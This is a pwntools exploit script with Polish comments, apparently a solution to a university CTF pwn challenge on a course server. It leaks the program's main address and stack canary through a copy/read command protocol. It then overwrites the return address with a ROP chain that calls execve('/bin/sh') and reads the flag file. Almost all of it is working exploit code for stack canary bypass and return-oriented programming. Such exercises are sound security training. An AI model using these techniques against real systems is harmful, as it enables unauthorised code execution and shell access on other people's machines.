from pwn import *

serverAddress = 'mim2022.tailcall.net'
p = remote(serverAddress, 30003)


# funkcja pomocnicza ustawiajace odpowiednio strukture cmd
def cmd(len, dist):
    return p16(len) + p16(dist)


# funkcja pomocnicza, imitująca wejscie do ifa w forze (czyli do kopiowania)
def _if(len, dist):
    assert dist != 0
    return cmd(len, dist)


# funkcja pomocnicza, imitująca wejscie do elsa w forze (czyli do czytania msg)
def _else(len, msg):
    return cmd(len, 0) + msg


# offsets figured out from ROPgadget and main relative address 000000000000a114
offset_rax = 292483
offset_rdi = -1250
offset_rsi = 54698
offset_rdx = -1493
offset_syscall = -2769

# fetch wypisywany tekst (smieci)
p.recv(timeout=1)
# Podmieniamy liczbe 0x__9c na 0x__14
first_main = _else(1, p8(0x14))

# I kopiujemy reszte bajtow return addressu oraz kopiujemy kanarka (do wypisania pozniej)
first_main += _if(7, 5 * 8) + _if(8, 264 + 8)

# wypelnienie bufferu i smieci przed kanarkiem
first_main += _else(1024 - 16 + 8, b'a' * (1024 - 16 + 8))

# jak w latwym, przepisanie kanarka z odpowiedniej pozycji + zapelnienie smieci SFP wystepujacych po kanarku
first_main += _if(8, 1024 + 264 + 8) + _else(8, b'a' * 8)
# zmiana return address maina, chcemy zrobic po skonczeniu tego maina zrobic returna do "drugiego" maina
first_main += _if(8, 8 + 8 + 8 + 1024)
# konczymy pierwszego maina, aby za chwile wejsc do "drugiego"
first_main += cmd(0, 0)

p.send(first_main)

# czytamy pierwsze 8 bajtow = main_address
main = u64(p.recvn(8))
# oraz 8 bajtow kanarka
canary = p.recvn(8)

# to samo co w latwym, tylko offset_register + main jako adres pop [register] ; ret
pop_rax = _else(8 + 8, p64(main + offset_rax) + p64(0x3b))
pop_rdi = _else(8, p64(main + offset_rdi)) + _if(8, 8 + 16 + 8 + 8 + 8 + 1024)
pop_rdx = _else(8 + 8,  p64(main + offset_rdx) + p64(0))
pop_rsi = _else(8 + 8, p64(main + offset_rsi) + p64(0))
pop_syscall = _else(8, p64(main + offset_syscall))

# drugi raz wywolany main, jedyna zmiana w stosunku do latwej wersji, to wczytanie kanarka, a nie skopiowanie
p.send(
    _else(1, p8(0xf8)) +
    _if(7, 16) +
    _else(1016, b'/bin/sh\0' * (1016 // 8)) +
    # wczytanie 8 bajtow, aby skipnac smieci
    _else(8, b'a' * 8) +
    # read kanarka
    _else(8, canary) +
    # nadpisujemy SFP i wczytanie 0
    _else(8, p64(0)) +

    # Nadpisujemy teraz return address!!! zaczynamy ROPchain
    # dodanie odpowiedniego rax do ROPchaina
    pop_rax +
    # rdi dodany do ROPchaina
    pop_rdi +
    # rsi dodany do ROPchaina
    pop_rsi +
    # rdx dodany do ROPchaina
    pop_rdx +
    # syscall dodany do ROPchaina
    pop_syscall +
    cmd(0, 0)
)

p.send(b'cat /home/pwn/flag.txt\n')

p.interactive()
